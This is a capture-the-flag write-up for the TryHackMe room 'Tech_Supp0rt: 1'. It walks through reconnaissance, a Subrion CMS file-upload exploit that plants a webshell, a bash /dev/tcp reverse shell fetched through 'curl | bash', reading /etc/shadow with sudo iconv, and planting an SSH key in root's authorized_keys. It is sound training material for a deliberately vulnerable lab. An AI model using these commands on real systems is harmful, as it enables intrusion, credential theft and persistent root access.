---
title: THM {Tech_Supp0rt1}
categories: [Tryhackme]
tags: [tryhackme, rce, searchsploit, wordpress, wpscan, nmap, smb, linux, smbclient, file upload, gobuster, nikto, smbmap, gtfobins]
math: true
image: "/assets/Tech_Supp0rt/Thumbnail.png"
---
# Tech_Supp0rt: 1
## About The Room
*Hack into the scammer's under-development website to foil their plans.*<br>
* Url: https://tryhackme.com/room/techsupp0rt1
* Creator: [Vikaran](https://tryhackme.com/p/Vikaran)
* Difficulty: Easy

## Reconnaissance
### Nmap
```bash
nmap -v -sC -sV 10.10.164.212            
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-01 08:37 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:37
Completed NSE at 08:37, 0.00s elapsed
Initiating NSE at 08:37
Completed NSE at 08:37, 0.00s elapsed
Initiating NSE at 08:37
Completed NSE at 08:37, 0.00s elapsed
Initiating Ping Scan at 08:37
Scanning 10.10.164.212 [2 ports]
Completed Ping Scan at 08:37, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:37
Completed Parallel DNS resolution of 1 host. at 08:37, 0.02s elapsed
Initiating Connect Scan at 08:37
Scanning 10.10.164.212 [1000 ports]
Discovered open port 445/tcp on 10.10.164.212
Discovered open port 22/tcp on 10.10.164.212
Discovered open port 80/tcp on 10.10.164.212
Discovered open port 139/tcp on 10.10.164.212
Completed Connect Scan at 08:37, 16.49s elapsed (1000 total ports)
Initiating Service scan at 08:37
Scanning 4 services on 10.10.164.212
Completed Service scan at 08:37, 11.59s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.164.212.
Initiating NSE at 08:37
Completed NSE at 08:37, 7.51s elapsed
Initiating NSE at 08:37
Completed NSE at 08:37, 0.70s elapsed
Initiating NSE at 08:37
Completed NSE at 08:37, 0.00s elapsed
Nmap scan report for 10.10.164.212
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-01T03:07:51
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-05-01T08:37:52+05:30
|_clock-skew: mean: -1h49m57s, deviation: 3h10m30s, median: 0s

NSE: Script Post-scanning.
Initiating NSE at 08:37
Completed NSE at 08:37, 0.00s elapsed
Initiating NSE at 08:37
Completed NSE at 08:37, 0.00s elapsed
Initiating NSE at 08:37
Completed NSE at 08:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.15 seconds
```
Port number `139` seems juicy. We'll get to it later. First, let's get some more intel about this machine.

### Gobuster
```bash
gobuster dir -u http://10.10.164.212/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.164.212/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/01 08:47:55 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.164.212/wordpress/]
/test                 (Status: 301) [Size: 313] [--> http://10.10.164.212/test/]     
Progress: 18897 / 220561 (8.57%)                                                    ^C
[!] Keyboard interrupt detected, terminating.
```
Hmmm.., `/wordpress` seems interesting. Let's check it out!

![wordpress 404](/assets/Tech_Supp0rt/wordpress.png)

We got a 404 page on it. Going over the website, we can see that most of the pages don't have anything useful in it, even looking through the source code doesn't get us any juicy recon. But, there are two pages named `BLOG` and `SAMPLE PAGE` which have some interesting things to look into.

Firstly, through the `BLOG` page, we get author's name which is `support`. This might come in handy later on.. who knows.

Through the `SAMPLE PAGE` page, we have a link to `your dashboard`. The interesting thing here is, when we click on this link we get landed on `http://10.0.2.15/wordpress/wp-admin/`. Notice, here the ip is changed. So, following the same pattern, we manually type `http://10.10.164.212/wordpress/wp-admin/` and voila, we have the wp-login page.

![wordpress login page](/assets/Tech_Supp0rt/wordpress-login.png)

### Nikto
```bash
nikto -h 10.10.164.212                                   
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.164.212
+ Target Hostname:    10.10.164.212
+ Target Port:        80
+ Start Time:         2022-05-01 08:47:16 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 5c367f4428b1f, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3092: /test/: This might be interesting...
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2022-05-01 09:11:59 (GMT5.5) (1483 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Except `/test`, we don't have the type of intel we can work with for this easy level box. So, taking the shot on this `/test`.

![test page](/assets/Tech_Supp0rt/test.png)

Till now, we have done decent exploring in this wordpress site. Now, time to do some more recon!

### Enum4linux

Enum4linux is a tool for enumerating information from Windows and Samba systems.

```bash
enum4linux 10.10.164.212                         
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun May  1 09:28:16 2022

 =========================================( Target Information )=========================================

Target ........... 10.10.164.212
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.164.212 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.10.164.212 )===============================

Looking up status of 10.10.164.212
No reply from 10.10.164.212

 ===================================( Session Check on 10.10.164.212 )===================================


[+] Server 10.10.164.212 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.164.212 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ==================================( OS information on 10.10.164.212 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.164.212 from srvinfo: 
        TECHSUPPORT    Wk Sv PrQ Unx NT SNT TechSupport server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =======================================( Users on 10.10.164.212 )=======================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 10.10.164.212 )=================================


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        websvr          Disk      
        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

[+] Attempting to map shares on 10.10.164.212

//10.10.164.212/print$  Mapping: DENIED Listing: N/A Writing: N/A
//10.10.164.212/websvr  Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.164.212/IPC$    Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 10.10.164.212 )===========================



[+] Attaching to 10.10.164.212 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] TECHSUPPORT
        [+] Builtin

[+] Password Info for Domain: TECHSUPPORT

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 ======================================( Groups on 10.10.164.212 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.10.164.212 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-21-2071169391-1069193170-3284189824 and logon username '', password ''

S-1-5-21-2071169391-1069193170-3284189824-501 TECHSUPPORT\nobody (Local User)
S-1-5-21-2071169391-1069193170-3284189824-513 TECHSUPPORT\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\scamsite (Local User)

 ===============================( Getting printer info for 10.10.164.212 )===============================

No printers returned.
```
We can see, `websvr` is one of the shareable resources and `scamsite` is a local user on this site. Sweet!

### smbmap

SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents etc.

```bash
smbmap -H 10.10.164.212                 
[+] Guest session       IP: 10.10.164.212:445   Name: 10.10.164.212                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        websvr                                                  READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (TechSupport server (Samba, Ubuntu))
```
We get to know that this `websvr` can be read by us. So, we'll be using smbclient.

### smbclient

SMBClient communicates with a LAN Manager server, offering an interface similar to that of the ftp program.

```bash
smbclient //10.10.164.212/websvr
Password for [WORKGROUP\uber]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 12:47:38 2021
  ..                                  D        0  Sat May 29 12:33:47 2021
  enter.txt                           N      273  Sat May 29 12:47:38 2021

                8460484 blocks of size 1024. 5696732 blocks available
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```
We got an `enter.txt` file. Let us take a look into it!

```bash
cat enter.txt   
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->redacted:redacted [cooked with magical formula]
Wordpress creds
|->

```
Woah!! We got some information about a `subrion` site and got them sweet creds too!

### subrion site

Manually entering `10.10.164.212/subrion/`, we get redirected to `https://10.0.2.15/subrion/subrion/`. Hmmm, let us do a hit and trial, we know that most of the sites have `robots.txt`, so this one might have too most probably. So, entering `http://10.10.164.212/subrion/robots.txt` and voila, we have some quite a juicy info!

![subrion robots.txt](/assets/Tech_Supp0rt/subrion-robots.png)

![subrion install](/assets/Tech_Supp0rt/subrion-install.png)

![subrion panel](/assets/Tech_Supp0rt/subrion-panel.png)

We are interested in `/panel`. We already have an username, and we need to get the password through [CyberChef](https://gchq.github.io/CyberChef/).

![cyberchef password decode](/assets/Tech_Supp0rt/cyberchef-password.png)

Entering the creds in `/panel`, now we are logged in. 

![panel login](/assets/Tech_Supp0rt/panel-login.png)

But, we don't want to do anything from here, so signing out we can see the version of this CMS.

![cms version](/assets/Tech_Supp0rt/panel-version.png)

## Getting Shell
### searchsploit

Going through searchsploit

```bash
searchsploit subrion                
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
Subrion 3.x - Multiple Vulnerabilities                                                              | php/webapps/38525.txt
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                             | php/webapps/47469.txt
Subrion Auto Classifieds - Persistent Cross-Site Scripting                                          | php/webapps/14391.txt
SUBRION CMS - Multiple Vulnerabilities                                                              | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                                          | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                                                        | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                                          | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scripting             | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                                                                   | php/webapps/40202.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                              | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                                           | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                    | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                                            | php/webapps/45150.txt
```
We'll mirror the `php/webapps/49876.py` to our system.

```bash
searchsploit -m php/webapps/49876.py
  Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/49876
     Path: /usr/share/exploitdb/exploits/php/webapps/49876.py
File Type: Python script, ASCII text executable, with very long lines (956)
```
Now, time to run this binary!

```bash
python3 49876.py -u http://10.10.164.212/subrion/panel/ -l admin -p redacted
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.164.212/subrion/panel/
[+] Success!
[+] Got CSRF token: LR6u6npNvGMeAvpkR6ySY9HhbBPNI4W6jpg3nZEw
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: savbxrtusrtjvcj

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.164.212/subrion/panel/uploads/savbxrtusrtjvcj.phar 

$ whoami
www-data

```
### Reverse Shell

We'll be getting a reverse shell. I wrote this simple reverse shell payload for this purpose `bash -i >& /dev/tcp/10.9.2.90/1234 0>&1`, save this payload in a .sh extension file. We will now start a simple http server `python3 -m http.server 8080` and start a netcat listener `nc -lvnp 1234` in a new terminal tab.

Now, on the victim box, we'll be using curl `curl http://10.9.2.90:8080/shell.sh | bash`.

> curl tries to display the file contents in the shell so to take advantage of this we piped this to bash so that our payload could run. We did not use wget because it was giving a hard time in running.
{: .prompt-info }

And Voila! We got the shell, but this is a 'dumb' shell, we need to upgrade it.

```bash
nc -lvnp 1234         
listening on [any] 1234 ...
connect to [10.9.2.90] from (UNKNOWN) [10.10.164.212] 50760
bash: cannot set terminal process group (1424): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TechSupport:/var/www/html/subrion/uploads$ whoami
whoami
www-data
www-data@TechSupport:/var/www/html/subrion/uploads$ python -c 'import pty; pty.spawn("/bin/sh")'
<ww/html/subrion/uploads$ python -c 'import pty; pty.spawn("/bin/sh")'       
$ export TERM=xterm-256color
export TERM=xterm-256color
$ 
```
![apache default page](/assets/Tech_Supp0rt/default-page.png)

Looking at the default apache page, `/var/www/html/` path kinda looks interesting.

```bash
$ cd /var/www/html/
cd /var/www/html/
$ ls
ls
index.html  phpinfo.php  subrion  test  wordpress
$ cd wordpress
cd wordpress
$ ls
ls
index.php        wp-blog-header.php    wp-includes        wp-settings.php
license.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php
readme.html      wp-config.php         wp-load.php        wp-trackback.php
wp-activate.php  wp-content            wp-login.php       xmlrpc.php
wp-admin         wp-cron.php           wp-mail.php

```
Hmmm.. this particular `wp-config.php` file seems interesting. We have to take a look!

```bash
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'redacted' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
...
```
We got the password for support user. Trying to change into this user.

```bash
$ su support
su support
No passwd entry for user 'support'
```
Hmmm.. Interesting, it seems that we can't change into this user but we can login to the wordpress page with the exact credentials.

![wordpress login](/assets/Tech_Supp0rt/support-wordpress-login.png)

No worries, we have one more user to try and that is `scamsite`.

```bash
$ su scamsite
su scamsite
Password: redacted

scamsite@TechSupport:/var/www/html/wordpress$ whoami
whoami
scamsite
```
Yes! We got in! Now it's time for some privelege escalation!!

## Privelege Escalation

We can do two things here either we can upload linpeas or we can do some manual work ourselves. I tried both methods, linpeas was taking much time so I skipped it.

In the shell, run `sudo -l` to get to know whether this user can run root level commands without knowing the password or not. For more amazing material, please refer to [PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#sudo)

```bash
scamsite@TechSupport:/$ sudo -l
sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```
This `iconv` binary can be exploited to read root level files. Like `/etc/shadow` or if we want to get lazyy we can directly read `/root/root.txt`. NICE!!

Do refer [GTFOBins](https://gtfobins.github.io/gtfobins/iconv/). First, let us read the shadow file.

```bash
scamsite@TechSupport:/$ LFILE=/etc/shadow
LFILE=/etc/shadow
scamsite@TechSupport:/$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
root:redacted:18775:0:99999:7:::
daemon:*:18484:0:99999:7:::
bin:*:18484:0:99999:7:::
sys:*:18484:0:99999:7:::
sync:*:18484:0:99999:7:::
games:*:18484:0:99999:7:::
man:*:18484:0:99999:7:::
lp:*:18484:0:99999:7:::
mail:*:18484:0:99999:7:::
news:*:18484:0:99999:7:::
uucp:*:18484:0:99999:7:::
proxy:*:18484:0:99999:7:::
www-data:*:18484:0:99999:7:::
backup:*:18484:0:99999:7:::
list:*:18484:0:99999:7:::
irc:*:18484:0:99999:7:::
gnats:*:18484:0:99999:7:::
nobody:*:18484:0:99999:7:::
systemd-timesync:*:18484:0:99999:7:::
systemd-network:*:18484:0:99999:7:::
systemd-resolve:*:18484:0:99999:7:::
systemd-bus-proxy:*:18484:0:99999:7:::
syslog:*:18484:0:99999:7:::
_apt:*:18484:0:99999:7:::
lxd:*:18775:0:99999:7:::
messagebus:*:18775:0:99999:7:::
uuidd:*:18775:0:99999:7:::
dnsmasq:*:18775:0:99999:7:::
sshd:*:18775:0:99999:7:::
scamsite:redacted:18775:0:99999:7:::
mysql:!:18775:0:99999:7:::
scamsite@TechSupport:/$ 
```
Finally getting the flag..!

```bash
scamsite@TechSupport:/$ LFILE=/root/root.txt
LFILE=/root/root.txt
scamsite@TechSupport:/$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
redacted
```
Although we got the flag, I feel we should do something more..! Let's generate public and private ssh keys on our machine to connect as root directly.

```bash
┌──(uber㉿uber)-[~/Desktop/THM/Tech_Supp0rt:1]
└─$ ssh-keygen                      
Generating public/private rsa key pair.
Enter file in which to save the key (/home/uber/.ssh/id_rsa): Tech_Supp0rt
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in Tech_Supp0rt
Your public key has been saved in Tech_Supp0rt.pub
The key fingerprint is:
SHA256:Zh43DnRlI0jcayQ2bXhYiwzt1PQlf+ilCn4zNhljxig uber@uber
The key's randomart image is:
+---[RSA 3072]----+
|      .+.X+ = .  |
|       o@.B* = . |
|       ++*o.. o o|
|       ...oo . + |
|        E.= * o  |
|       + B = =   |
|        . o O    |
|           o +   |
|                 |
+----[SHA256]-----+
```
On the victim's machine, we will exploit the `iconv` write functionality by using our public key.

```bash
scamsite@TechSupport:/var/www/html/subrion/uploads$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCu2oOGSoMPqskfBzUhe13Mb1VccosdW6HGd7iF0TSX8CqlWyh01oZOIpPxefSLpjoxMFdjyfYVJbFvsRGEmKzmS0AxljOCxQpqdYZ15CgSFROioOwHKai3JSqCkBPJfWyPO4auhQPDHK8Klm0ftxomtgQPJgqAzF7W+YAEbo0lxOp9LgOZZBMT6I83boQReAHA6nC/+RLwnOWIDSn/q2plHwIzP32lvL2Ux9BQ9bqukZXDfTiQ7ykWYQ6Uwihwfyk6ZXK8vsXzOrphGAC+ZpqPWy0dw4vwoPq/xbqH1rf8IIrjV1362NNZAfEGKc4ELm2h741UEh3YMINDG+fBmGPmAh6OiN0Q7gb02uMcLOhT5oXstWPYDWxegKd8xjQph5MAcfQFn5hpVW2WlESXJ8VGGg1En3Sox2bnrcndxxq6SIsc+Lom14nOOeUnrOocgYgClKpKNsasZpoSfrG3HUUEB41dVhNYqYwutIs3NqdjJGw1VQWS2683ahQDmHtCLfU= uber@uber" | sudo iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
```
Now, from our system, we will attemp an ssh connection using our private key.

```bash
┌──(uber㉿uber)-[~/Desktop/THM/Tech_Supp0rt:1]
└─$ ssh root@10.10.164.212 -i Tech_Supp0rt
Enter passphrase for key 'Tech_Supp0rt': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


120 packages can be updated.
88 updates are security updates.


Last login: Sun May  1 12:10:25 2022 from 10.9.2.90
root@TechSupport:~# whoami
root
root@TechSupport:~# ls
root.txt
root@TechSupport:~# cat root.txt
redacted
root@TechSupport:~# 
```
That's it folks, this was all about the Tech_Support box.

Thank you so much for being till the end. See you guys next time...!